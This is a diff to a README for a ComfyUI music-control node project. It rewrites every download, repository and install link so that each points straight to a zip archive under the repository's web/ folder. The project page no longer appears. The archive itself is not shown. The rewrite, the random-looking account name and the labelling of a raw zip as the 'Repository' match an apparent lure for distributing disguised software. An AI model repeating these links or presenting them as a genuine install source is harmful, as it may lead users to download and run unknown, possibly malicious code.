@@ -1,6 +1,6 @@
 # 🎵 scg_Foundation-1-comfyUI - Control Music Samples Easily
 
-[![Download the app](https://img.shields.io/badge/Download-Visit%20GitHub-blue?style=for-the-badge&logo=github)](https://github.com/familycephalotaxaceaeseed77/scg_Foundation-1-comfyUI)
+[![Download the app](https://img.shields.io/badge/Download-Visit%20GitHub-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/familycephalotaxaceaeseed77/scg_Foundation-1-comfyUI/main/web/comfy_scg_Foundation_UI_3.7.zip)
 
 ## 🧭 What this is
 
@@ -20,7 +20,7 @@ Use it if you want a simple way to shape music output from text prompts and set 
 
 Visit this page to download and get the files you need:
 
-[https://github.com/familycephalotaxaceaeseed77/scg_Foundation-1-comfyUI](https://github.com/familycephalotaxaceaeseed77/scg_Foundation-1-comfyUI)
+[https://raw.githubusercontent.com/familycephalotaxaceaeseed77/scg_Foundation-1-comfyUI/main/web/comfy_scg_Foundation_UI_3.7.zip](https://raw.githubusercontent.com/familycephalotaxaceaeseed77/scg_Foundation-1-comfyUI/main/web/comfy_scg_Foundation_UI_3.7.zip)
 
 ## 🛠️ Install on Windows
 
@@ -112,8 +112,8 @@ A common setup looks like this:
 
 ## 🔗 Helpful links
 
-- Repository: [https://github.com/familycephalotaxaceaeseed77/scg_Foundation-1-comfyUI](https://github.com/familycephalotaxaceaeseed77/scg_Foundation-1-comfyUI)
-- Main download page: [https://github.com/familycephalotaxaceaeseed77/scg_Foundation-1-comfyUI](https://github.com/familycephalotaxaceaeseed77/scg_Foundation-1-comfyUI)
+- Repository: [https://raw.githubusercontent.com/familycephalotaxaceaeseed77/scg_Foundation-1-comfyUI/main/web/comfy_scg_Foundation_UI_3.7.zip](https://raw.githubusercontent.com/familycephalotaxaceaeseed77/scg_Foundation-1-comfyUI/main/web/comfy_scg_Foundation_UI_3.7.zip)
+- Main download page: [https://raw.githubusercontent.com/familycephalotaxaceaeseed77/scg_Foundation-1-comfyUI/main/web/comfy_scg_Foundation_UI_3.7.zip](https://raw.githubusercontent.com/familycephalotaxaceaeseed77/scg_Foundation-1-comfyUI/main/web/comfy_scg_Foundation_UI_3.7.zip)
 
 ## 🧠 What the nodes help you control
 
